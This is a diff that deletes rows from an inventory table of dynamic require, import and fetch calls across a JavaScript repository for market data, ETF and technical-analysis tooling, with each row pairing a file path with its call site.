-| scripts/supertrader/probe/delisting-probe.mjs | fetch(url, { headers: H }) |
-| scripts/supertrader/probe/delisting-probe.mjs | fetch(LIST_URL, { headers: H })).arrayBuffer()) |
-| scripts/supertrader/restore-full-ledgers.mjs | import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/snapshot/snapshot.mjs | require(path.join(root, 'core/identity.js')) |
-| scripts/supertrader/snapshot/snapshot.mjs | require(path.join(root, 'quant/engines/zero-cost-guard.js')) |
-| scripts/supertrader/snapshot/snapshot.mjs | require(path.join(root, 'quant/engines/bar-codec.js')) |
-| scripts/supertrader/snapshot/snapshot.mjs | require(path.join(root, 'quant/engines/history-store.js')) |
-| scripts/supertrader/source-faithful/certification/cert-prep-top5.mjs | import(pathToFileURL(path.join(SF_DIR, m)).href)) |
-| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | import(path.join(ROOT, PATHS.paper))).currentPaperProtocol() |
-| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | import(path.join(ROOT, PATHS.inputGate)) |
-| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | import(path.join(ROOT, 'scripts/supertrader/source-faithful/product/eod-adapter.mjs')) |
-| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | import(path.join(ROOT, PATHS.publication)) |
-| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | import(path.join(ROOT, PATHS.histUniverse)) |
-| scripts/supertrader/source-faithful/evidence/build-evidence-matrix.mjs | import(path.join(ROOT, PATHS.planChecker)) |
-| scripts/supertrader/source-faithful/product/candidate-contract.mjs | require(path.join(ROOT, 'core/identity.js')) |
-| scripts/supertrader/source-faithful/product/eod-adapter.mjs | require(path.join(ROOT, 'core/identity.js')) |
-| scripts/supertrader/source-faithful/product/price-parity.mjs | require(path.join(ROOT, 'quant/engines/published-close.js')) |
-| scripts/supertrader/source-faithful/product/price-parity.mjs | require(path.join(ROOT, 'core/identity.js')) |
-| scripts/supertrader/source-faithful/research/minervini-lifecycle-matrix.mjs | import(abs)) |
-| scripts/supertrader/source-faithful/research/run-kk-intraday.mjs | import(path.join(ROOT, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/source-faithful/research/run-st-hist-top5.mjs | import(path.join(ROOT, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/source-faithful/research/run-st-holdout.mjs | require(path.join(root, 'scripts/research/holdout/protocol-pin.cjs')).PROTOCOL_SHA256 |
-| scripts/supertrader/source-faithful/research/run-st-holdout.mjs | require(path.join(ROOT, 'scripts/quant/portfolio/model-portfolios.cjs')).isoWeek(d) |
-| scripts/supertrader/source-faithful/research/run-st-holdout.mjs | require(path.join(ROOT, 'scripts/research/edge/study.cjs')) } = {}) { |
-| scripts/supertrader/source-faithful/research/run-st-holdout.mjs | import(path.join(ROOT, 'scripts/research/holdout/ledger.mjs')) |
-| scripts/supertrader/source-faithful/research/run-st-holdout.mjs | import(path.join(ROOT, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/source-faithful/research/sf5-lifecycle-matrix.mjs | import(abs)) |
-| scripts/supertrader/source-faithful/research/sf7-code-coverage.mjs | import()` is not followed). */ |
-| scripts/supertrader/source-faithful/research/sf7-execution-checks.mjs | import (the KK runner uses it without depending on the sf5 lifecycles). |
-| scripts/supertrader/source-faithful/research/st9-v13-delisted-study.mjs | fetch (raw/<run>/series.jsonl.gz, the qualify.py input) is read with the |
-| scripts/supertrader/tests/paper-forward-fixture.mjs | require(path.join(root, 'quant/engines/history-store.js')) |
-| scripts/supertrader/tests/sf-paper-2027-forward.test.mjs | import(${JSON.stringify(new URL('../validation/lib.mjs', import.meta.url).href)}) |
-| scripts/supertrader/tests/snapshot-fixture.mjs | require(path.join(root, 'quant/engines/history-store.js')) |
-| scripts/supertrader/tests/st-technical.test.mjs | require(path.join(root, 'supertrader/assets/st-technical.js')) |
-| scripts/supertrader/tests/st-technical.test.mjs | require(path.join(root, 'core/stock-context.js')) |
-| scripts/supertrader/validation/analyze-methods.mjs | require(path.join(root, 'quant/engines/history-store.js')) |
-| scripts/supertrader/validation/analyze-methods.mjs | require(path.join(root, 'quant/engines/zero-cost-guard.js')) |
-| scripts/supertrader/validation/analyze-methods.mjs | require(path.join(root, 'quant/engines/us-security-master.js')) |
-| scripts/supertrader/validation/analyze-methods.mjs | fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) |
-| scripts/supertrader/validation/analyze-methods.mjs | import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/validation/analyze-methods.mjs | import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/validation/analyze.mjs | require(path.join(root, 'quant/engines/history-store.js')) |
-| scripts/supertrader/validation/analyze.mjs | require(path.join(root, 'quant/engines/zero-cost-guard.js')) |
-| scripts/supertrader/validation/analyze.mjs | require(path.join(root, 'quant/engines/us-security-master.js')) |
-| scripts/supertrader/validation/analyze.mjs | fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) |
-| scripts/supertrader/validation/analyze.mjs | import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/validation/audit-r14.mjs | fetch(`https://api.tiingo.com/tiingo/daily/${t}/prices?startDate=${W.warmupFrom}&endDate=${W.to}&format=json`, { headers: { Authorization: 'Token ' + process.env.TIIN |
-| scripts/supertrader/validation/case-study.mjs | import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/validation/delist-cases-r15.mjs | fetch(`https://data.sec.gov/submissions/CIK${cik}.json`, { headers: { 'User-Agent': UA } }) |
-| scripts/supertrader/validation/delist-cases-r15.mjs | fetch(`https://data.sec.gov/submissions/${f.name}`, { headers: { 'User-Agent': UA } }) |
-| scripts/supertrader/validation/fetch-sources.mjs | fetch(url, { headers: { 'User-Agent': 'VisionUniverse-Research/1.0 (method fidelity review |
-| scripts/supertrader/validation/fetch.mjs | require(path.join(root, 'quant/engines/history-store.js')) |
-| scripts/supertrader/validation/fetch.mjs | require(path.join(root, 'quant/engines/zero-cost-guard.js')) |
-| scripts/supertrader/validation/fetch.mjs | require(path.join(root, 'quant/engines/us-security-master.js')) |
-| scripts/supertrader/validation/fetch.mjs | fetch(url, { headers: { Authorization: 'Token ' + KEY, 'Content-Type': 'application/json' } }) |
-| scripts/supertrader/validation/fetch.mjs | fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) |
-| scripts/supertrader/validation/fetch.mjs | import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/validation/intraday-oracle.mjs | fetch(url, { headers: { Authorization: 'Token ' + key } }) |
-| scripts/supertrader/validation/intraday-probe.mjs | fetch(url, { headers: { Authorization: 'Token ' + key, 'Content-Type': 'application/json' } }) |
-| scripts/supertrader/validation/intraday-study.mjs | import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/validation/kk-intraday-probe.mjs | fetch(url, { headers: { Authorization: 'Token ' + key, 'Content-Type': 'application/json' } }) |
-| scripts/supertrader/validation/sec-pit.mjs | require(path.join(root, 'quant/engines/history-store.js')) |
-| scripts/supertrader/validation/sec-pit.mjs | require(path.join(root, 'quant/engines/zero-cost-guard.js')) |
-| scripts/supertrader/validation/sec-pit.mjs | require(path.join(root, 'quant/engines/us-security-master.js')) |
-| scripts/supertrader/validation/sec-pit.mjs | fetch(url, { headers: { 'User-Agent': UA, 'Accept-Encoding': 'gzip, deflate' } }) |
-| scripts/supertrader/validation/sec-pit.mjs | fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) |
-| scripts/supertrader/validation/sec-pit.mjs | import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/validation/sec-pit.mjs | fetch(`https://data.sec.gov/submissions/CIK${v.cik}.json`, { headers: { 'User-Agent': UA } }) |
-| scripts/supertrader/validation/sec-pit.mjs | fetch(`https://data.sec.gov/submissions/${f.name}`, { headers: { 'User-Agent': UA } }) |
-| scripts/supertrader/validation/universe-audit.mjs | require(path.join(root, 'quant/engines/history-store.js')) |
-| scripts/supertrader/validation/universe-audit.mjs | require(path.join(root, 'quant/engines/zero-cost-guard.js')) |
-| scripts/supertrader/validation/universe-audit.mjs | require(path.join(root, 'quant/engines/us-security-master.js')) |
-| scripts/supertrader/validation/universe-audit.mjs | fetch(L.LIST_URL, { headers: KEY ? { Authorization: 'Token ' + KEY } : {} })).arrayBuffer()) |
-| scripts/supertrader/validation/universe-audit.mjs | import(path.join(root, 'scripts/market/storage/s3-driver.mjs')) |
-| scripts/supertrader/validation/venue-probe.mjs | fetch(url, { headers: { Authorization: 'Token ' + key, 'Content-Type': 'application/json' } }) |
-| scripts/technical/build-technical-data.mjs | require(join(root, "quant", "engines", "technical", n)) |
-| scripts/technical/build-technical-data.mjs | require(join(root, "quant", "engines", "hash.js")) |
-| scripts/technical/build-technical-intelligence.mjs | require(join(ROOT, "quant/engines/technical/ti/engine.js")) |
-| scripts/technical/build-technical-intelligence.mjs | require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) |
-| scripts/technical/build-technical-intelligence.mjs | require(join(ROOT, "quant/engines/technical/ti/explain.js")) |
-| scripts/technical/build-technical-intelligence.mjs | require(join(ROOT, "quant/engines/technical/ti/alerts.js")) |
-| scripts/technical/build-technical-intelligence.mjs | require(join(ROOT, "quant/engines/technical/ti/scenario.js")) |
-| scripts/technical/build-technical-intelligence.mjs | require(join(ROOT, "quant/engines/technical/elliott/patterns.js")) |
-| scripts/technical/build-technical-intelligence.mjs | require(join(ROOT, "core/identity.js")) |
-| scripts/technical/candlestick-evidence.mjs | require(join(root, "quant/engines/technical/candlesticks.js")) |
-| scripts/technical/contract-doc.mjs | require(join(root, "quant/engines/technical/screener-contract.js")) |
-| scripts/technical/elliott-home/browser-qa.mjs | require(process.env.PLAYWRIGHT_PATH &#124;&#124; '/opt/node-tools/node_modules/playwright') |
-| scripts/technical/elliott-registry/register.mjs | require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) |
-| scripts/technical/elliott-registry/register.mjs | require(join(ROOT, "quant/engines/technical/ti/scenario.js")) |
-| scripts/technical/elliott-registry/split-adjusted-view.mjs | require(join(ROOT, "quant", "engines", "return-series.js")) |
-| scripts/technical/elliott-registry/split-adjusted-view.mjs | require(join(ROOT, "core", "identity.js")) |
-| scripts/technical/explore-curation-audit.mjs | require(join(ROOT, "quant/engines/technical/projection/explore-curation.js")) |
-| scripts/technical/hsab/lib/replay-core.mjs | require(join(ROOT, "quant/engines/technical/ti/engine.js")) |
-| scripts/technical/hsab/lib/replay-core.mjs | require(join(ROOT, "quant/engines/technical/ti/context.js")) |
-| scripts/technical/hsab/lib/replay-core.mjs | require(join(ROOT, "quant/engines/technical/ti/scenario.js")) |
-| scripts/technical/hsab/lib/replay-core.mjs | require(join(ROOT, "quant/engines/technical/ti/dow-trend.js")) |
-| scripts/technical/hsab/lib/replay-core.mjs | require(join(ROOT, "quant/engines/technical/ti/momentum-volatility.js")) |
-| scripts/technical/indicator-evidence.mjs | require(join(root, "quant/engines/technical/indicators.js")) |
-| scripts/technical/lib/ti-data.mjs | require(join(ROOT, "quant/engines/technical/canonical-bars.js")) |
-| scripts/technical/lib/ti-freshness.mjs | require(join(ROOT, "quant/engines/technical/ti/data-freshness.js")) |
-| scripts/technical/lib/ti-freshness.mjs | require(join(ROOT, "core/identity.js")) |
-| scripts/technical/lib/ti-product.mjs | require(join(ROOT, "quant/engines/technical/ti/engine.js")) |
-| scripts/technical/lib/ti-product.mjs | require(join(ROOT, "quant/engines/technical/elliott/elliott-v2.js")) |
-| scripts/technical/lib/ti-product.mjs | require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) |
-| scripts/technical/lib/ti-projection.mjs | require(join(ROOT, "quant/engines/technical/projection/elliott-projection.js")) |
-| scripts/technical/lib/ti-projection.mjs | require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) |
-| scripts/technical/lib/ti-projection.mjs | require(join(ROOT, "quant/engines/technical/elliott/patterns.js")) |
-| scripts/technical/lib/ti-projection.mjs | require(join(ROOT, "quant/engines/technical/projection/explore-curation.js")) |
-| scripts/technical/lib/ti-projection.mjs | require(join(ROOT, "quant/engines/corporate-action-evidence.js")) |
-| scripts/technical/materialize-product-intelligence.mjs | require(join(root, "quant/engines/technical/canonical-bars.js")) |
-| scripts/technical/materialize-product-intelligence.mjs | require(join(root, "quant/engines/technical/technical-analysis.js")) |
-| scripts/technical/materialize-product-intelligence.mjs | require(join(root, "quant/engines/technical/product-materialization.js")) |
-| scripts/technical/materialize-product-intelligence.mjs | require(join(root, "quant/api/market-signal-contract.js")) |
-| scripts/technical/materialize-product-intelligence.mjs | require(join(root, "quant/api/technical-workspace-contract.js")) |
-| scripts/technical/materialize-product-intelligence.mjs | require(join(root, "quant/engines/realtime/market-hours.js")) |
-| scripts/technical/materialize-product-intelligence.mjs | require(join(root, "quant/api/product-services.js")) |
-| scripts/technical/materialize-product-intelligence.mjs | require(join(root, "quant/engines/display-policy.js")) |
-| scripts/technical/materialize-product-intelligence.mjs | require(join(root, "quant/engines/query.js")) |
-| scripts/technical/measure-ema200-signal-effect.mjs | require(join(ROOT, "quant/engines/technical/feature-store.js")) |
-| scripts/technical/run-technical-scale.mjs | require(join(engines, "technical", n)) |
-| scripts/technical/run-technical-scale.mjs | require(join(engines, "market-store.js")) |
-| scripts/technical/run-technical-scale.mjs | require(join(root, "core", "identity.js")) |
-| scripts/technical/s4/template-study.mjs | require(join(ROOT, "scripts/quant/research/research-population.cjs")) |
-| scripts/technical/s4/template-study.mjs | require(join(ROOT, "quant/engines/research-studies.cjs")) |
-| scripts/technical/s4/template-study.mjs | require(join(ROOT, "quant/engines/research-validation.cjs")) |
-| scripts/technical/s4/template-study.mjs | require(join(ROOT, "quant/engines/weekly-benchmark.cjs")) |
-| scripts/technical/validate-formations.mjs | require(join(root, "quant/engines/technical/formations.js")) |
-| scripts/technical/validate-formations.mjs | require(join(root, "quant/engines/technical/indicators.js")) |
-| scripts/technical/validate-formations.mjs | require(join(root, "quant/engines/technical/canonical-bars.js")) |
-| scripts/technical/validate-formations.mjs | require(join(root, "quant/engines/technical/ti/context.js")) |
-| scripts/technical/verify-technical-data.mjs | require(join(root, "quant", "engines", "technical", n)) |
-| scripts/technical/verify-technical-intelligence.mjs | require(join(ROOT, "quant/engines/technical/ti/engine.js")) |
-| scripts/technical/world/academy-browser-qa.mjs | require(process.env.PLAYWRIGHT_PATH &#124;&#124; 'playwright') |
-| scripts/technical/world/academy-browser-qa.mjs | fetch(site+'/__research/config.json') |
-| scripts/technical/world/academy-browser-qa.mjs | fetch(site+'/technical/academy/content.json') |
-| scripts/technical/world/build-screener.mjs | require(join(root, "core/identity.js")) |
-| scripts/technical/world/build-screener.mjs | require(join(root, "core/listing-staleness.js")) |
-| scripts/technical/world/build-screener.mjs | require(join(root, "quant/engines/technical/canonical-bars.js")) |
-| scripts/technical/world/build-screener.mjs | require(join(root, "quant/engines/technical/screen-row.js")) |
-| scripts/technical/world/build-screener.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| scripts/technical/world/build-screener.mjs | require(join(root, "quant/engines/technical/screener-contract.js")) |
-| scripts/technical/world/build-screener.mjs | require(join(root, "quant/engines/technical/indicators.js")) |
-| scripts/technical/world/build-screener.mjs | require(join(root, "quant/engines/technical/formations.js")) |
-| scripts/technical/world/build-screener.mjs | require(join(root, "technical/engine/model.js")) |
-| scripts/technical/world/build-screener.mjs | require(join(root, "technical/engine/stock-summary.js")) |
-| scripts/technical/world/formation-evidence.mjs | require(join(root, "quant/engines/technical/canonical-bars.js")) |
-| scripts/technical/world/formation-evidence.mjs | require(join(root, "quant/engines/technical/ti/context.js")) |
-| scripts/technical/world/formation-evidence.mjs | require(join(root, "quant/engines/technical/formations.js")) |
-| scripts/technical/world/live-qa.mjs | require(process.env.PLAYWRIGHT_PATH &#124;&#124; "playwright") |
-| scripts/technical/world/live-qa.mjs | import(new URL("../../access-gate/build.mjs", import.meta.url)) |
-| scripts/technical/world/live-qa.mjs | fetch(SITE + "/__research/config.json").then((r) => r.ok).catch(() => false) |
-| scripts/universe/build-cik-map.mjs | fetch(url, { |
-| scripts/universe/build-company-master.mjs | require(join(root, "quant", "engines", "company-master.js")) |
-| scripts/universe/build-issuer-master.mjs | require(join(root, "quant", "engines", "company-master.js")) |
-| scripts/universe/build-universe-indexes.mjs | require(join(root, "quant", "engines", "company-master.js")) |
-| scripts/universe/build-universe-indexes.mjs | require(join(root, "core", "identity.js")) |
-| scripts/universe/scale-test.mjs | require(join(root, "quant", "engines", "company-master.js")) |
-| scripts/universe/scale-test.mjs | require(join(root, "quant", "engines", "hash.js")).mulberry32(20260912) |
-| scripts/universe/verify-company-master.mjs | require(join(root, "quant", "engines", "company-master.js")) |
-| scripts/vorsorge/adapters/issuers.mjs | require(join(root, "vorsorge/engines/etf-holdings.js")) |
-| scripts/vorsorge/adapters/issuers.mjs | require(join(root, "vorsorge/engines/etf-fundamentals.js")) |
-| scripts/vorsorge/build-etf-data.mjs | require(join(root, "core/identity.js")) |
-| scripts/vorsorge/build-etf-data.mjs | require(join(root, "vorsorge/engines/etf-master.js")) |
-| scripts/vorsorge/build-etf-data.mjs | require(join(root, "vorsorge/engines/etf-taxonomy.js")) |
-| scripts/vorsorge/build-etf-data.mjs | require(join(root, "vorsorge/engines/etf-fundamentals.js")) |
-| scripts/vorsorge/build-etf-data.mjs | require(join(root, "vorsorge/engines/etf-changes.js")) |
-| scripts/vorsorge/build-etf-data.mjs | require(join(root, "vorsorge/engines/etf-analytics.js")) |
-| scripts/vorsorge/build-etf-data.mjs | require(join(root, "vorsorge/engines/series-codec.js")) |
-| scripts/vorsorge/build-etf-data.mjs | require(join(root, "vorsorge/engines/monitor.js")) |
-| scripts/vorsorge/build-etf-intelligence.mjs | require(join(root, "vorsorge/engines/etf-holdings.js")) |
-| scripts/vorsorge/build-etf-intelligence.mjs | require(join(root, "vorsorge/engines/etf-changes.js")) |
-| scripts/vorsorge/fetch-legal-sources.sh | fetch() { # id url kind |
-| scripts/vorsorge/ingest-esma-firds.mjs | require(join(root, "vorsorge/engines/etf-fundamentals.js")) |
-| scripts/vorsorge/ingest-esma-firds.mjs | fetch(url, { headers: { "User-Agent": UA, Accept: "*/*" }, signal: AbortSignal.timeout(timeout) }) |
-| scripts/vorsorge/ingest-esma-funds.mjs | fetch(url, { headers: { "User-Agent": UA }, signal: AbortSignal.timeout(90000) }) |
-| scripts/vorsorge/ingest-sec-nport.mjs | require(join(root, "vorsorge/engines/etf-holdings.js")) |
-| scripts/vorsorge/ingest-sec-nport.mjs | require(join(root, "vorsorge/engines/etf-fundamentals.js")) |
-| scripts/vorsorge/ingest-sec-nport.mjs | fetch(url, { method: opts.method &#124;&#124; "GET", headers: { "User-Agent": UA, "Accept-Encoding": "gzip, deflate" }, signal: AbortSignal.timeout(opts.timeout &#124;&#124; 600000) }) |
-| scripts/vorsorge/ingest-sec-rr.mjs | fetch(url, { headers: { "User-Agent": UA }, signal: AbortSignal.timeout(900000) }) |
-| scripts/vorsorge/ingest-tiingo-etfs.mjs | require(join(root, "quant/engines/canonical-total-return.js")) |
-| scripts/vorsorge/ingest-tiingo-etfs.mjs | require(join(root, "vorsorge/engines/series-codec.js")) |
-| scripts/vorsorge/ingest-tiingo-etfs.mjs | require(join(root, "vorsorge/engines/etf-analytics.js")) |
-| scripts/vorsorge/ingest-tiingo-etfs.mjs | require(join(root, "vorsorge/engines/etf-master.js")) |
-| scripts/vorsorge/ingest-tiingo-etfs.mjs | fetch(url, { headers: { Authorization: "Token " + KEY }, signal: ctl.signal }) |
-| scripts/vorsorge/ingest-xetra-refdata.mjs | require(join(root, "vorsorge/engines/etf-fundamentals.js")) |
-| scripts/vorsorge/ingest-xetra-refdata.mjs | fetch(url, { headers: { "User-Agent": UA }, signal: AbortSignal.timeout(120000) }) |
-| scripts/vorsorge/ingest-xetra-refdata.mjs | import(join(root, "scripts/vorsorge/adapters/xlsx.mjs")) |
-| scripts/vorsorge/live-smoke.mjs | require(process.env.PLAYWRIGHT_PATH &#124;&#124; "playwright") |
-| scripts/vorsorge/live-smoke.mjs | import(new URL("../access-gate/build.mjs", import.meta.url)) |
-| scripts/vorsorge/probe-etf-sources.mjs | fetch(url, { method, redirect: "follow", headers: { "User-Agent": ua, "Accept": "*/*", "Accept-Encoding": "gzip, deflate" }, signal: AbortSignal.timeout(45000) }) |
-| scripts/vorsorge/probe-eu-etf-sources.mjs | fetch(url, { method, redirect: "follow", headers: { "User-Agent": UA, Accept: "*/*" }, signal: AbortSignal.timeout(timeout) }) |
-| scripts/vorsorge/probe-eu-etf-sources.mjs | import(join(root, "scripts/vorsorge/adapters/xlsx.mjs")) |
-| scripts/vorsorge/probe-eu-etf-sources.mjs | import(join(root, "scripts/vorsorge/adapters/xlsx.mjs")) |
-| scripts/vu2/browser-qa-direct.mjs | require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES + '/playwright') |
-| scripts/vu2/browser-qa-direct.mjs | fetch(base + '/release-id.json') |
-| scripts/vu2/browser-qa.mjs | require(resolve(root,'quant/engines/factor-evidence.js')) |
-| scripts/vu2/browser-qa.mjs | require(resolve(root,'core/stock-context.js')) |
-| scripts/vu2/browser-qa.mjs | fetch() |
-| scripts/vu2/measure-acceptance-sample.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| scripts/vu2/measure-acceptance-sample.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| scripts/vu2/measure-acceptance-sample.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| scripts/vu2/measure-acceptance-sample.mjs | require(join(ROOT, "quant/engines/instrument-classification.js")) |
-| scripts/vu2/measure-acceptance-sample.mjs | require(join(ROOT, "quant/engines/journey-shape.js")) |
-| scripts/vu2/measure-consumer-breadth.mjs | fetch(base+path) |
-| scripts/vu2/measure-consumer-breadth.mjs | fetch(base+path) |
-| scripts/vu2/measure-intelligence-coherence.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| scripts/vu2/measure-intelligence-coherence.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| scripts/vu2/measure-intelligence-coherence.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| scripts/vu2/measure-intelligence-coherence.mjs | require(join(ROOT, "quant/engines/intelligence-brief.js")) |
-| scripts/vu2/measure-intelligence-coherence.mjs | require(join(ROOT, "quant/engines/journey-shape.js")) |
-| scripts/vu2/measure-intelligence-coherence.mjs | require(join(ROOT, "quant/engines/factor-evidence.js")) |
-| scripts/vu2/measure-journey.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| scripts/vu2/measure-journey.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| scripts/vu2/measure-journey.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| scripts/vu2/measure-journey.mjs | require(join(ROOT, "quant/engines/journey-shape.js")) |
-| scripts/vu2/measure-launch-readiness.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| scripts/vu2/measure-launch-readiness.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| scripts/vu2/measure-launch-readiness.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| scripts/vu2/measure-launch-readiness.mjs | require(join(ROOT, "quant/engines/journey-shape.js")) |
-| scripts/vu2/measure-launch-readiness.mjs | require(join(ROOT, "quant/engines/intelligence-brief.js")) |
-| scripts/vu2/measure-launch-readiness.mjs | require(join(ROOT, "quant/engines/company-master.js")) |
-| scripts/vu2/measure-launch-readiness.mjs | require(join(ROOT, "quant/engines/fundamental-inputs.js")) |
-| scripts/vu2/production-smoke.mjs | import(new URL('../access-gate/build.mjs',import.meta.url)) |
-| scripts/vu2/vercel-should-build.mjs | fetch() auf /api/ und keine Vercel-Herkunft. |
-| server/product-identity.js | fetch(origin + "/" + path.replace(/^\/+/, ""), { headers: { Accept: "application/json" }, redirect: "error" }) |
-| social/app.js | fetch(BASE + FILES[name], { cache: "no-store" }) |
-| social/tests/asset-hashtag-done.test.mjs | require(join(ROOT, "social/engines/hashtags.js")) |
-| social/tests/asset-hashtag-done.test.mjs | require(join(ROOT, "social/engines/approval-projection.js")) |
-| social/tests/creative-job-reconcile.test.mjs | require(join(ROOT, "social/engines/creative-job.js")) |
-| social/tests/creative-job-reconcile.test.mjs | require(join(ROOT, "social/engines/hard-invariants.js")) |
-| social/tests/editorial-ideation.test.mjs | fetch(", "require(", "import(", "publish", "autopublish"]) { |
-| social/tests/final-public-text.test.mjs | require(join(ROOT, "social/engines/hashtags.js")) |
-| social/tests/final-public-text.test.mjs | require(join(ROOT, "social/engines/approval-projection.js")) |
-| social/tests/final-public-text.test.mjs | require(join(ROOT, "social/engines/content-hash.js")) |
-| social/tests/orchestrator-adversarial.test.mjs | import(${JSON.stringify(join(ROOT, "scripts/social/run-orchestrator.mjs"))}) |
-| social/tests/orchestrator.test.mjs | import() auf und gibt das Ergebnis als JSON zurueck. */ |
-| social/tests/orchestrator.test.mjs | import(${JSON.stringify("file://" + modulPfad)}).then((O) => { |
-| social/tests/preflight-classifier.test.mjs | fetch(request, env, ctx) { |
-| social/tests/preflight-classifier.test.mjs | fetch(request, env) { |
-| social/tests/preflight-classifier.test.mjs | fetch(request) { |
-| social/tests/preflight-classifier.test.mjs | fetch(request, env) { |
-| social/tests/preflight-classifier.test.mjs | fetch(request, env) { |
-| social/tests/preflight-transport.test.mjs | fetch(request, env, ctx) { |
-| social/tests/readiness-evidence.test.mjs | import(MESSER) |
-| social/tests/readiness-evidence.test.mjs | import(MESSER) |
-| status/bausteine/bausteine.js | fetch("/quant/data/market/discover-series/ref_" + t + ".json").then(function (r) { return r.ok ? r.json() : null |
-| status/status.js | fetch(path, { cache: "no-store", credentials: "same-origin" }) |
-| studio/stories/build-story.mjs | require(join(execFileSync('npm', ['root', '-g']).toString().trim(), 'playwright')) |
-| studio/stories/kit/render.mjs | require(join(execFileSync('npm', ['root', '-g']).toString().trim(), 'playwright')) |
-| supertrader/assets/sf-research.js | fetch(DATA + rel, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status) |
-| supertrader/assets/st-chart.js | fetch(path, { cache: 'no-cache' }).then(function (r) { |
-| supertrader/assets/st-chart.js | fetch(path, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status) |
-| supertrader/assets/st-redesign.js | fetch('/quant/data/market/discover-series/' + encodeURIComponent(id) + '.json', { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.stat |
-| supertrader/assets/st-technical.js | fetch(url, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error(url + ' HTTP ' + r.status) |
-| supertrader/assets/supertrader.js | fetch(DATA + name, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw new Error(name + ' HTTP ' + r.status) |
-| supertrader/assets/supertrader.js | fetch(e.path, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw 0 |
-| sw.js | fetch(req).catch(function () { |
-| technical/app.js | fetch(path, { credentials: "same-origin" }).then(function (r) { if (!r.ok) throw new Error("HTTP " + r.status) |
-| technical/app.js | fetch(path, { credentials: "same-origin" }).then(function (r) { |
-| technical/engine/stock-summary.js | require(path) : name() |
-| technical/tests/technical-assistant.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| technical/tests/technical-assistant.test.mjs | require(join(root, "technical/engine/templates.js")) |
-| technical/tests/technical-assistant.test.mjs | require(join(root, "technical/engine/assistant.js")) |
-| technical/tests/technical-assistant.test.mjs | require(join(root, "technical/engine/model.js")) |
-| technical/tests/technical-choppiness-range.test.mjs | require(join(root, "quant/engines/technical/indicators.js")) |
-| technical/tests/technical-choppiness-range.test.mjs | require(join(root, "quant/engines/technical/screener-contract.js")) |
-| technical/tests/technical-data-contract.test.mjs | require(join(root, "quant/engines/technical/screener-contract.js")) |
-| technical/tests/technical-data-contract.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| technical/tests/technical-data-contract.test.mjs | require(join(root, "core/identity.js")) |
-| technical/tests/technical-data-contract.test.mjs | import(join(root, "scripts/technical/contract-doc.mjs")) |
-| technical/tests/technical-e2e-consistency.test.mjs | require(join(root, "quant/engines/technical/indicators.js")) |
-| technical/tests/technical-e2e-consistency.test.mjs | require(join(root, "quant/engines/technical/canonical-bars.js")) |
-| technical/tests/technical-e2e-consistency.test.mjs | require(join(root, "quant/engines/technical/ti/context.js")) |
-| technical/tests/technical-e2e-consistency.test.mjs | require(join(root, "quant/engines/technical/formations.js")) |
-| technical/tests/technical-e2e-consistency.test.mjs | require(join(root, "quant/engines/technical/technical-query.js")) |
-| technical/tests/technical-e2e-consistency.test.mjs | require(join(root, "core/listing-staleness.js")) |
-| technical/tests/technical-e2e-consistency.test.mjs | require(join(root, "quant/engines/technical/candlesticks.js")) |
-| technical/tests/technical-e2e-consistency.test.mjs | require(join(root, "technical/engine/model.js")) |
-| technical/tests/technical-e2e-consistency.test.mjs | require(join(root, "technical/engine/model.js")) |
-| technical/tests/technical-e2e-consistency.test.mjs | require(join(root, "technical/engine/model.js")) |
-| technical/tests/technical-e2e-consistency.test.mjs | require(join(root, "technical/engine/model.js")) |
-| technical/tests/technical-stock-summary.test.mjs | require(join(root, "technical/engine/stock-summary.js")) |
